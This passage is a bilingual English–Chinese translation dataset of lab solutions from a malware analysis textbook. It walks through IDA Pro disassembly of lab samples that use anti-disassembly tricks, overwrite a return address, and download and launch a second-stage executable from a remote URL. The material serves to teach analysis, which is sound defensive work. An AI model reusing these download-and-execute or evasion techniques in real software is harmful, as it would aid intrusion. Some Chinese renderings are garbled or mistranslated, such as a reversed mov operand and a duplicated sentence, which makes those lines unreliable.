  zh: 004012E8 EB 05 jmp short loc_4012EF 
- en: 004012EA ; ------------------------------------------------------------
  id: totrans-5224
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EA ; ------------------------------------------------------------
- en: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short loc_4012E8
  id: totrans-5225
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short loc_4012E8
- en: 004012EC ; ------------------------------------------------------------
  id: totrans-5226
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EC ; ------------------------------------------------------------
- en: 004012EE E8 db 0E8h 
  id: totrans-5227
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EE E8 db 0E8h 
- en: 004012EF ; ------------------------------------------------------------
  id: totrans-5228
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EF ; ------------------------------------------------------------
- en: 004012EF
  id: totrans-5229
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EF
- en: '004012EF loc_4012EF: ; CODE XREF: loc_4012E8j 004012EF 6A 0A push 0Ah'
  id: totrans-5230
  prefs: []
  type: TYPE_NORMAL
  zh: '004012EF loc_4012EF: ; CODE XREF: loc_4012E8j 004012EF 6A 0A push 0Ah'
- en: '*Listing 15-7L: Manually repaired anti-disassembly code* You can convert all
    the extra db bytes (like the one shown at ) to NOPs using the IDA Python **PatchByte**
    option described after Listing 15-4L. This will allow you to create a proper function
    within IDA Pro. To create a function, after patching the NOPs, select all the
    code from the retn instruction on line 0x0040130E to the beginning of the function
    at 0x00401000, and press the P key. To view the resulting function graphically,
    press the spacebar.'
  id: totrans-5231
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-7L：手动修复的反反汇编代码* 您可以使用列表15-4L之后描述的IDA Python **PatchByte**选项将所有额外的db字节（如所示）转换为NOPs。这将允许您在IDA
    Pro中创建一个合适的函数。要创建一个函数，在修补NOPs之后，从0x0040130E行的retn指令开始选择所有代码到0x00401000函数开始处，然后按P键。要图形化查看结果函数，按空格键。'
- en: The two functions (sub_4012F2 and sub_401369) immediately follow the main function.
    Each builds a string on the stack, duplicating it to the heap with strdup, and
    returns a pointer to the heap string. The malware author crafted this function
    to build the string so that it will not show up as a plaintext string in the binary,
    but will appear only in memory at runtime. The first of these two functions produces
    the string http://www.practicalmalwareanalysis.com/
  id: totrans-5232
  prefs: []
  type: TYPE_NORMAL
  zh: 这两个函数（sub_4012F2和sub_401369）紧随主函数之后。每个函数都在堆栈上构建一个字符串，使用strdup将其复制到堆中，并返回堆字符串的指针。恶意软件作者精心设计了此函数，以便构建的字符串在二进制文件中不会显示为明文字符串，而仅在运行时内存中显示。这两个函数中的第一个生成了字符串http://www.practicalmalwareanalysis.com/
- en: bamboo.html, and the second produces the string Account Summary.xls.exe.
  id: totrans-5233
  prefs: []
  type: TYPE_NORMAL
  zh: bamboo.html，第二个生成了字符串Account Summary.xls.exe。
- en: Having defeated all the anti-disassembly countermeasures in the main function,
    these functions should show cross-references to where they are called from the
    main function. Rename these functions buildURL and buildFilename by putting your
    cursor on the function name and pressing the N key on the keyboard.
  id: totrans-5234
  prefs: []
  type: TYPE_NORMAL
  zh: 在主函数中击败了所有的反反汇编对策之后，这些函数应该显示从主函数中调用的交叉引用。通过将光标放在函数名称上并按键盘上的N键，将这些函数重命名为buildURL和buildFilename。
- en: Listing 15-8L shows the call to buildURL (our renamed function) at .
  id: totrans-5235
  prefs: []
  type: TYPE_NORMAL
  zh: 列表15-8L显示了调用buildURL（我们重命名的函数）的位置。
- en: '**1 5**'
  id: totrans-5236
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 5**'
- en: 0040115F push 0
  id: totrans-5237
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115F push 0
- en: 00401161 push 0
  id: totrans-5238
  prefs: []
  type: TYPE_NORMAL
  zh: 00401161 push 0
- en: 00401163 push 0
  id: totrans-5239
  prefs: []
  type: TYPE_NORMAL
  zh: 00401163 push 0
- en: 00401167 push 0
  id: totrans-5240
  prefs: []
  type: TYPE_NORMAL
  zh: 00401167 push 0
- en: 0040116C call buildURL 
  id: totrans-5241
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116C call buildURL 
- en: 0040116D push eax
  id: totrans-5242
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116D push eax
- en: 00401173 mov edx, [ebp+var_10114]
  id: totrans-5243
  prefs: []
  type: TYPE_NORMAL
  zh: 00401173 mov edx, [ebp+var_10114]
- en: 00401174 push edx
  id: totrans-5244
  prefs: []
  type: TYPE_NORMAL
  zh: 00401174 push edx
- en: 0040117A call ds:InternetOpenUrlA 
  id: totrans-5245
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117A call ds:InternetOpenUrlA 
- en: '*Listing 15-8L: Opening the* http://www.practicalmalwareanalysis.com/bamboo.html
    *URL*'
  id: totrans-5246
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-8L：打开* http://www.practicalmalwareanalysis.com/bamboo.html *URL*'
- en: Reading the code further, we see that it attempts to open the *bamboo.html*
    URL returned from buildURL at  using InternetOpenUrlA. In order to determine
    the User-Agent string used by the malware when calling the InternetOpenUrlA function,
    we need to first find the InternetOpen function call and determine what data is
    passed to it. Earlier in the function, we see InternetOpenA called, as shown in
    Listing 15-9L.
  id: totrans-5247
  prefs: []
  type: TYPE_NORMAL
  zh: 继续阅读代码，我们看到它尝试使用InternetOpenUrlA打开buildURL在返回的*bamboo.html* URL。为了确定恶意软件在调用InternetOpenUrlA函数时使用的User-Agent字符串，我们首先需要找到InternetOpen函数调用并确定传递给它的数据。在函数的早期部分，我们看到InternetOpenA被调用，如列表15-9L所示。
- en: Solutions to Labs
  id: totrans-5248
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**649**'
  id: totrans-5249
  prefs: []
  type: TYPE_NORMAL
  zh: '**649**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5250
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040113F push 0
  id: totrans-5251
  prefs: []
  type: TYPE_NORMAL
  zh: 0040113F push 0
- en: 00401141 push 0
  id: totrans-5252
  prefs: []
  type: TYPE_NORMAL
  zh: 00401141 push 0
- en: 00401143 push 0
  id: totrans-5253
  prefs: []
  type: TYPE_NORMAL
  zh: 00401143 push 0
- en: 00401145 push 1
  id: totrans-5254
  prefs: []
  type: TYPE_NORMAL
  zh: 00401145 push 1
- en: 00401147 lea ecx, [ebp+name] 
  id: totrans-5255
  prefs: []
  type: TYPE_NORMAL
  zh: 00401147 lea ecx, [ebp+name] 
- en: 0040114D push ecx 
  id: totrans-5256
  prefs: []
  type: TYPE_NORMAL
  zh: 0040114D push ecx 
- en: 0040114E call ds:InternetOpenA
  id: totrans-5257
  prefs: []
  type: TYPE_NORMAL
  zh: 0040114E call ds:InternetOpenA
- en: '*Listing 15-9L: Setting up the connection via InternetOpenA* The first argument
    to InternetOpenA at  is the User-Agent string. ECX is pushed as this argument,
    and the lea instruction loads it with a pointer to a location on the stack. IDA
    Pro’s stack frame analysis has named this location name, as seen at . We must
    scroll up in the function to see where name is getting populated. Near the beginning
    of the function, shown in Listing 15-10L, we see a reference to the name location
    at .'
  id: totrans-5258
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-9L：通过InternetOpenA设置连接* 在处的InternetOpenA的第一个参数是User-Agent字符串。ECX作为此参数被推入，lea指令将其加载为堆栈上位置的指针。IDA
    Pro的堆栈帧分析将此位置命名为name，如所示。我们必须在函数中向上滚动以查看name是如何被填充的。在函数的开始部分，如列表15-10L所示，我们看到对name位置的引用。'
- en: 00401047 push 100h ; namelen 0040104C lea eax, [ebp+name] 
  id: totrans-5259
  prefs: []
  type: TYPE_NORMAL
  zh: 00401047 push 100h ; namelen 0040104C lea eax, [ebp+name] 
- en: 00401052 push eax ; name
  id: totrans-5260
  prefs: []
  type: TYPE_NORMAL
  zh: 00401052 push eax ; name
- en: 00401053 call ds:gethostname
  id: totrans-5261
  prefs: []
  type: TYPE_NORMAL
  zh: 00401053 call ds:gethostname
- en: '*Listing 15-10L: Using gethostname to get the local machine’s name* The gethostname
    function will populate a buffer with the hostname of the local machine. Based
    on Listing 15-10L, you might be tempted to conclude that the User-Agent string
    will be the hostname, but you would be only partially correct. In fact, careful
    examination of the code between locations 0x00401073 and 0x0040113F (not shown
    here) reveals a loop that is responsible for modifying each letter or number within
    the hostname by incrementing it by one before using it as the User-Agent. (The
    letter and number at the end, *Z* and 9, are reset to *A* and 0.)'
  id: totrans-5262
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-10L：使用 gethostname 获取本地计算机的名称* gethostname 函数将本地计算机的名称填充到一个缓冲区中。根据列表
    15-10L，您可能会得出结论，User-Agent 字符串将是主机名，但您只对了一半。实际上，仔细检查 0x00401073 和 0x0040113F 位置之间的代码（此处未显示）揭示了一个循环，该循环负责在将其用作
    User-Agent 之前将主机名中的每个字母或数字增加一个。 （末尾的字母和数字 *Z* 和 9 被重置为 *A* 和 0。）'
- en: Following the call to InternetOpenA and the first call to InternetOpenUrlA,
    the data (an HTML web page) is downloaded to a local buffer with a call to InternetReadFile,
    as shown in Listing 15-11L at . The buffer to contain the data is the second
    argument, which has been named automatically by IDA Pro as Str at . A few lines
    down in the function, we see the Str buffer accessed again at .
  id: totrans-5263
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 InternetOpenA 和第一次调用 InternetOpenUrlA 之后，数据（一个 HTML 网页）通过调用 InternetReadFile
    下载到本地缓冲区，如列表 15-11L 所示。包含数据的缓冲区是第二个参数，由 IDA Pro 自动命名为 Str。在函数中向下几行，我们看到 Str 缓冲区再次在
     处被访问。
- en: 0040118F push eax
  id: totrans-5264
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118F 压入 eax
- en: 00401190 push 0FFFFh
  id: totrans-5265
  prefs: []
  type: TYPE_NORMAL
  zh: 00401190 压入 0FFFFh
- en: 00401195 lea ecx, [ebp+Str] 
  id: totrans-5266
  prefs: []
  type: TYPE_NORMAL
  zh: 00401195 将 [ebp+Str] 的值加载到 ecx 
- en: 0040119B push ecx
  id: totrans-5267
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119B 压入 ecx
- en: 0040119C mov edx, [ebp+var_10C]
  id: totrans-5268
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119C 将 [ebp+var_10C] 的值移动到 edx
- en: 004011A2 push edx
  id: totrans-5269
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A2 将 edx 压入堆栈
- en: 004011A3 call ds:InternetReadFile 
  id: totrans-5270
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A3 调用 ds:InternetReadFile 
- en: '...'
  id: totrans-5271
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004011D5 push offset SubStr ; "Bamboo::"
  id: totrans-5272
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D5 压入 SubStr 的偏移量 ; "Bamboo::"
- en: 004011DA lea ecx, [ebp+Str] 
  id: totrans-5273
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DA 将 [ebp+Str] 的值加载到 ecx 
- en: '**650**'
  id: totrans-5274
  prefs: []
  type: TYPE_NORMAL
  zh: '**650**'
- en: Appendix C
  id: totrans-5275
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5276
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004011E0 push ecx ; Str 004011E1 call ds:strstr 
  id: totrans-5277
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E0 压入 ecx ; Str 004011E1 调用 ds:strstr 
- en: '*Listing 15-11L: Reading and parsing the downloaded HTML*'
  id: totrans-5278
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-11L：读取和解析下载的 HTML*'
- en: The strstr function at  is used to find a substring within a larger string.
  id: totrans-5279
  prefs: []
  type: TYPE_NORMAL
  zh: 在  位置使用的 strstr 函数用于在较长的字符串中查找子字符串。
- en: 'In this case, it is finding the string Bamboo:: within the buffer Str, which
    contains all the data we retrieved from the initial URL. The code immediately
    following the strstr call is shown in Listing 15-12L.'
  id: totrans-5280
  prefs: []
  type: TYPE_NORMAL
  zh: '在这种情况下，它正在缓冲区 Str 中查找 Bamboo:: 字符串，该缓冲区包含我们从初始 URL 获取的所有数据。strstr 调用之后的代码显示在列表
    15-12L 中。'
- en: 004011E7 add esp, 8
  id: totrans-5281
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E7 将 esp 增加 8
- en: 004011EA mov [ebp+var_108], eax 
  id: totrans-5282
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EA 将 eax 的值移动到 [ebp+var_108] 
- en: 004011F0 cmp [ebp+var_108], 0
  id: totrans-5283
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F0 比较 [ebp+var_108] 的值和 0
- en: 004011F7 jz loc_401306
  id: totrans-5284
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F7 如果为零跳转到 loc_401306
- en: 004011FD push offset asc_40303C ; "::"
  id: totrans-5285
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FD 压入 asc_40303C 的偏移量 ; "::"
- en: 00401202 mov edx, [ebp+var_108]
  id: totrans-5286
  prefs: []
  type: TYPE_NORMAL
  zh: 00401202 将 [ebp+var_108] 的值移动到 edx
- en: 00401208 push edx ; Str
  id: totrans-5287
  prefs: []
  type: TYPE_NORMAL
  zh: 00401208 压入 edx ; Str
- en: 00401209 call ds:strstr 
  id: totrans-5288
  prefs: []
  type: TYPE_NORMAL
  zh: 00401209 调用 ds:strstr 
- en: 0040120F add esp, 8
  id: totrans-5289
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120F 将 esp 增加 8
- en: 00401212 mov byte ptr [eax], 0 
  id: totrans-5290
  prefs: []
  type: TYPE_NORMAL
  zh: 00401212 将 eax 指向的内存字节设置为 0 
- en: '...'
  id: totrans-5291
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401232 mov eax, [ebp+var_108]
  id: totrans-5292
  prefs: []
  type: TYPE_NORMAL
  zh: 00401232 将 eax 的值移动到 [ebp+var_108]
- en: 00401238 add eax, 8 
  id: totrans-5293
  prefs: []
  type: TYPE_NORMAL
  zh: 00401238 添加 eax, 8 
- en: 0040123E mov [ebp+var_108], eax
  id: totrans-5294
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123E 将 eax 的值移动到 [ebp+var_108]
- en: '*Listing 15-12L: Parsing a string separated by Bamboo:: and ::* As you can
    see, the pointer to the string Bamboo:: found within the downloaded HTML is stored
    in var_108 at . A second call to strstr, seen at , is called to search for the
    next ::. Once two colons are found, the code at '
  id: totrans-5295
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-12L：解析由 Bamboo:: 和 :: 分隔的字符串* 如您所见，下载的 HTML 中找到的 Bamboo:: 字符串的指针存储在
    var_108 中。在  处可以看到第二次调用 strstr，用于搜索下一个 ::。一旦找到两个冒号，代码在  处执行。'
- en: 'replaces the first colon with a NULL, which is designed to terminate the string
    that is contained in between Bamboo:: and ::.'
  id: totrans-5296
  prefs: []
  type: TYPE_NORMAL
  zh: '将第一个冒号替换为 NULL，这是为了终止 Bamboo:: 和 :: 之间的字符串。'
- en: The pointer stored at var_108 is incremented by eight at . This hap-1 5
  id: totrans-5297
  prefs: []
  type: TYPE_NORMAL
  zh: '在 var_108 位置存储的指针通过八位增加。这相当于 Bamboo:: 的确切字符串长度，这正是指针所引用的内容。在此操作之后，指针将引用冒号之后的任何内容。由于代码已经找到了尾随的冒号并将它们替换为
    NULL，我们现在有了 Bamboo:: 和 :: 之间内容的正确空终止字符串，这些内容存储在 var_108 中。'
- en: 'pens to be the exact string length of Bamboo::, which is what the pointer is
    referencing. After this operation, the pointer will reference whatever followed
    the colons. Since the code already found the trailing colons and substituted them
    with a NULL, we now have a proper NULL-terminated string for whatever was in between
    Bamboo:: and :: stored in var_108\.'
  id: totrans-5298
  prefs: []
  type: TYPE_NORMAL
  zh: '这看起来像是 Bamboo:: 的确切字符串长度，这正是指针所引用的内容。在此操作之后，指针将引用冒号之后的任何内容。由于代码已经找到了尾随的冒号并将它们替换为
    NULL，我们现在有了 Bamboo:: 和 :: 之间内容的正确空终止字符串，这些内容存储在 var_108 中。'
- en: Immediately following the string-parsing code, we see var_108 used at 
  id: totrans-5299
  prefs: []
  type: TYPE_NORMAL
  zh: 在字符串解析代码之后，我们看到 var_108 在  处被使用
- en: in Listing 15-13L.
  id: totrans-5300
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 15-13L 中。
- en: 00401247 push 0
  id: totrans-5301
  prefs: []
  type: TYPE_NORMAL
  zh: 00401247 push 0
- en: 00401249 push 0
  id: totrans-5302
  prefs: []
  type: TYPE_NORMAL
  zh: 00401249 push 0
- en: 0040124B push 0
  id: totrans-5303
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124B push 0
- en: 0040124D push 0
  id: totrans-5304
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124D push 0
- en: 0040124F mov ecx, [ebp+var_108] 
  id: totrans-5305
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124F mov ecx, [ebp+var_108] 
- en: 00401255 push ecx
  id: totrans-5306
  prefs: []
  type: TYPE_NORMAL
  zh: 00401255 push ecx
- en: 00401256 mov edx, [ebp+var_10114]
  id: totrans-5307
  prefs: []
  type: TYPE_NORMAL
  zh: 00401256 mov edx, [ebp+var_10114]
- en: 0040125C push edx
  id: totrans-5308
  prefs: []
  type: TYPE_NORMAL
  zh: 0040125C push edx
- en: 0040125D call ds:InternetOpenUrlA
  id: totrans-5309
  prefs: []
  type: TYPE_NORMAL
  zh: 0040125D call ds:InternetOpenUrlA
- en: '*Listing 15-13L: Opening another URL in order to download more malware* Solutions
    to Labs'
  id: totrans-5310
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-13L：为了下载更多恶意软件而打开另一个 URL* 实验室解决方案'
- en: '**651**'
  id: totrans-5311
  prefs: []
  type: TYPE_NORMAL
  zh: '**651**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5312
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The second argument (var_108) to InternetOpenUrlA is the URL to open.
  id: totrans-5313
  prefs: []
  type: TYPE_NORMAL
  zh: InternetOpenUrlA 的第二个参数（var_108）是要打开的 URL。
- en: 'Therefore, the data in between the Bamboo:: and the trailing colons is intended
    to be a URL for the program to download. Analysis of the code between lines 0x0040126E
    and 0x004012E3 (not shown here), reveals that the URL opened in Listing 15-13L
    is downloaded to the file *Account Summary.xls.exe*, which is then launched by
    a call to ShellExecute on line 0x00401300\.'
  id: totrans-5314
  prefs: []
  type: TYPE_NORMAL
  zh: '因此，在 Bamboo:: 和尾部冒号之间的数据旨在是程序下载的 URL。分析第 0x0040126E 行到第 0x004012E3 行之间的代码（此处未显示），揭示在列表
    15-13L 中打开的 URL 被下载到文件 *Account Summary.xls.exe*，然后通过第 0x00401300 行的 ShellExecute
    调用启动。'
- en: '**Lab 15-3 Solutions**'
  id: totrans-5315
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室 15-3 解决方案**'
- en: '***Short Answers***'
  id: totrans-5316
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-5317
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: The malicious code is initially called by overwriting the return pointer from
    the main function.
  id: totrans-5318
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码最初是通过覆盖主函数的返回指针来调用的。
- en: 2\.
  id: totrans-5319
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The malicious code downloads a file from a URL and launches it with WinExec.
  id: totrans-5320
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码从 URL 下载文件并使用 WinExec 启动它。
- en: 3\.
  id: totrans-5321
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The URL used by the program is *http://www.practicalmalwareanalysis.com/*
  id: totrans-5322
  prefs: []
  type: TYPE_NORMAL
  zh: 程序使用的 URL 是 *http://www.practicalmalwareanalysis.com/*
- en: '*tt.html*.'
  id: totrans-5323
  prefs: []
  type: TYPE_NORMAL
  zh: '*tt.html*.'
- en: 4\.
  id: totrans-5324
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: The filename used by the program is *spoolsrv.exe*.
  id: totrans-5325
  prefs: []
  type: TYPE_NORMAL
  zh: 程序使用的文件名为 *spoolsrv.exe*。
- en: '***Detailed Analysis***'
  id: totrans-5326
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Quickly examining this binary, it initially seems to be a process-listing tool.
    You might have also noticed a few suspicious imports, such as URLDownloadToFile
    and WinExec. If you scrolled near the bottom of the code in IDA Pro, just before
    the C runtime library code, you may have even noticed where these suspicious functions
    are called. This code does not seem to be a part of the program at all. There
    is no reference to it, and much of it isn’t even disassembled.
  id: totrans-5327
  prefs: []
  type: TYPE_NORMAL
  zh: 快速检查这个二进制文件，最初看起来像是一个进程列表工具。你可能也注意到了一些可疑的导入，例如 URLDownloadToFile 和 WinExec。如果你在
    IDA Pro 中的代码底部附近滚动，就在 C 运行时库代码之前，你可能甚至注意到这些可疑函数被调用的位置。这段代码似乎根本不是程序的一部分。没有任何引用，而且其中很大一部分甚至没有被反汇编。
- en: Scroll to the top of the main function and examine the lines of disassembly,
    as shown in Listing 15-14L.
  id: totrans-5328
  prefs: []
  type: TYPE_NORMAL
  zh: 滚动到主函数的顶部，检查反汇编的行，如列表 15-14L 所示。
- en: 0040100C mov eax, 400000h 
  id: totrans-5329
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100C mov eax, 400000h 
- en: 00401011 or eax, 148Ch 
  id: totrans-5330
  prefs: []
  type: TYPE_NORMAL
  zh: 00401011 or eax, 148Ch 
- en: 00401016 mov [ebp+4], eax 
  id: totrans-5331
  prefs: []
  type: TYPE_NORMAL
  zh: 00401016 mov [ebp+4], eax 
- en: '*Listing 15-14L: Calculating an address and loading it on the stack* This code
    builds the value 0x0040148C by ORing 0x400000  and 0x148C '
  id: totrans-5332
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-14L：计算地址并将其加载到堆栈上* 此代码通过 OR 0x400000  和 0x148C  构建值 0x0040148C。'
- en: together and storing it in EAX. The code loads that value to some location on
    the stack relative to EBP at . You can press CTRL-K to bring up a stack frame
    view of the current function to see that offset 4 points to the return address.
    By overwriting the return address, when the main function ends, the orphaned code
    at 0x0040148C will execute instead of the normal process-termination code in the
    C runtime library.
  id: totrans-5333
  prefs: []
  type: TYPE_NORMAL
  zh: 将其存储在 EAX 中。代码将这个值加载到与 EBP 相关的堆栈上的某个位置，如  所示。你可以按 CTRL-K 打开当前函数的堆栈帧视图，以查看偏移量
    4 指向返回地址。通过覆盖返回地址，当主函数结束时，0x0040148C 处的孤儿代码将执行，而不是 C 运行时库中的正常进程终止代码。
- en: The start of the code at 0x0040148C is not identified by IDA Pro as being part
    of a function, as shown in Listing 15-15L.
  id: totrans-5334
  prefs: []
  type: TYPE_NORMAL
  zh: 0x0040148C 处的代码在 IDA Pro 中没有被识别为函数的一部分，如列表 15-15L 所示。
- en: '**652**'
  id: totrans-5335
  prefs: []
  type: TYPE_NORMAL
  zh: '**652**'
- en: Appendix C
  id: totrans-5336
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5337
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040148C push ebp
  id: totrans-5338
  prefs: []
  type: TYPE_NORMAL
  zh: 0040148C push ebp
- en: 0040148D mov ebp, esp
  id: totrans-5339
  prefs: []
  type: TYPE_NORMAL
  zh: 0040148D mov ebp, esp
- en: 0040148F push ebx
  id: totrans-5340
  prefs: []
  type: TYPE_NORMAL
  zh: 0040148F push ebx
- en: 00401490 push esi
  id: totrans-5341
  prefs: []
  type: TYPE_NORMAL
  zh: 00401490 push esi
- en: 00401491 push edi
  id: totrans-5342
  prefs: []
  type: TYPE_NORMAL
  zh: 00401491 push edi
- en: 00401492 xor eax, eax
  id: totrans-5343
  prefs: []
  type: TYPE_NORMAL
  zh: 00401492 xor eax, eax
- en: 00401494 jz short near ptr loc_401496+1 
  id: totrans-5344
  prefs: []
  type: TYPE_NORMAL
  zh: 00401494 jz short near ptr loc_401496+1 
- en: 00401496
  id: totrans-5345
  prefs: []
  type: TYPE_NORMAL
  zh: 00401496
- en: '00401496 loc_401496: ; CODE XREF: 00401494j 00401496 jmp near ptr 4054D503h
    '
  id: totrans-5346
  prefs: []
  type: TYPE_NORMAL
  zh: '00401496 loc_401496: ; CODE XREF: 00401494j 00401496 jmp near ptr 4054D503h
    '
- en: '*Listing 15-15L: The orphaned code assembled at 0x40148C*'
  id: totrans-5347
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 15-15L：在 0x40148C 处汇编的孤儿代码*'
- en: This orphaned code begins as a normal function, but then we encounter an anti-disassembly
    countermeasure in the form of a false conditional at .
  id: totrans-5348
  prefs: []
  type: TYPE_NORMAL
  zh: 这段孤立代码最初是一个正常函数，但随后我们遇到了以假条件形式出现的一种反汇编对抗措施。
- en: Here, the jz instruction will always jump. The target of the jump is 0x00401497,
    which is currently not shown in the disassembly because it is the second byte
    of a 5-byte jmp instruction shown at . Place your cursor on the jmp instruction
    at  and press the D key to turn it into data. Then place your cursor on line
    0x00401497 and press C to turn it into code.
  id: totrans-5349
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，jz 指令总是会跳转。跳转的目标是 0x00401497，目前在反汇编中未显示，因为它是一个 5 字节 jmp 指令的第二字节，该指令在处显示。将光标放在处的
    jmp 指令上并按 D 键将其转换为数据。然后，将光标放在行 0x00401497 上并按 C 键将其转换为代码。
- en: Once 0x00401497 is disassembled correctly, the next block of code you will see
    is shown in Listing 15-16L.
  id: totrans-5350
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦正确反汇编了 0x00401497，你将看到的下一块代码如清单 15-16L 所示。
- en: 00401497 push offset dword_4014C0
  id: totrans-5351
  prefs: []
  type: TYPE_NORMAL
  zh: 00401497 推送 offset dword_4014C0
- en: 0040149C push large dword ptr fs:0
  id: totrans-5352
  prefs: []
  type: TYPE_NORMAL
  zh: 0040149C 推送 large dword ptr fs:0
- en: 004014A3 mov large fs:0, esp
  id: totrans-5353
  prefs: []
  type: TYPE_NORMAL
  zh: 004014A3 将 large fs:0 的值移动到 esp
- en: 004014AA xor ecx, ecx
  id: totrans-5354
  prefs: []
  type: TYPE_NORMAL
  zh: 004014AA xor ecx, ecx
- en: 004014AC div ecx 
  id: totrans-5355
  prefs: []
  type: TYPE_NORMAL
  zh: 004014AC 除以 ecx 
- en: 004014AE push offset aForMoreInforma ; "For more information..."
  id: totrans-5356
  prefs: []
  type: TYPE_NORMAL
  zh: 004014AE 推送 offset aForMoreInforma ; "更多信息..."
- en: 004014B3 call printf
  id: totrans-5357
  prefs: []
  type: TYPE_NORMAL
  zh: 004014B3 调用 printf
- en: '*Listing 15-16L: Building an exception handler and triggering an exception*
    **1 5**'
  id: totrans-5358
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 15-16L：构建异常处理程序并触发异常* **1 5**'
- en: The lines at  and  are placed there solely to pose as a decoy; they will never
    be executed. The first five lines of this fragment build an exception handler
    and trigger a divide-by-zero exception at . (The ECX will always be zero because
    of the xor ecx,ecx in the previous instruction.) The location handling the exception
    is 0x004014C0, as shown in Listing 15-17L.
  id: totrans-5359
  prefs: []
  type: TYPE_NORMAL
  zh: 和处的行仅放置在那里以充当诱饵；它们永远不会被执行。此片段的前五行构建了一个异常处理程序并在处触发除以零异常。（由于前一条指令中的 xor ecx,ecx，ECX
    总是为零。）处理异常的位置是 0x004014C0，如清单 15-17L 所示。
- en: 004014C0 dword_4014C0 dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
  id: totrans-5360
  prefs: []
  type: TYPE_NORMAL
  zh: 004014C0 dword_4014C0 dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
- en: '004014C0 ; DATA XREF: loc_401497o 004014D4 dd 0EB08C483h, 0E848C0FFh, 0'
  id: totrans-5361
  prefs: []
  type: TYPE_NORMAL
  zh: '004014C0 ; DATA XREF: loc_401497o 004014D4 dd 0EB08C483h, 0E848C0FFh, 0'
- en: '*Listing 15-17L: The exception-handling code currently defined as data* IDA
    Pro did not recognize the data in Listing 15-17L as code, and has chosen instead
    to represent it as a series of DWORDs. Place your cursor on the first DWORD and
    press the C key to change this into code.'
  id: totrans-5362
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 15-17L：当前定义为数据的异常处理代码* IDA Pro 没有将清单 15-17L 中的数据识别为代码，而是选择将其表示为一系列 DWORD。将光标放在第一个
    DWORD 上并按 C 键将其更改为代码。'
- en: Solutions to Labs
  id: totrans-5363
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**653**'
  id: totrans-5364
  prefs: []
  type: TYPE_NORMAL
  zh: '**653**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5365
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: After successfully changing the data in Listing 15-17L to code, it is displayed
    as shown in Listing 15-18L.
  id: totrans-5366
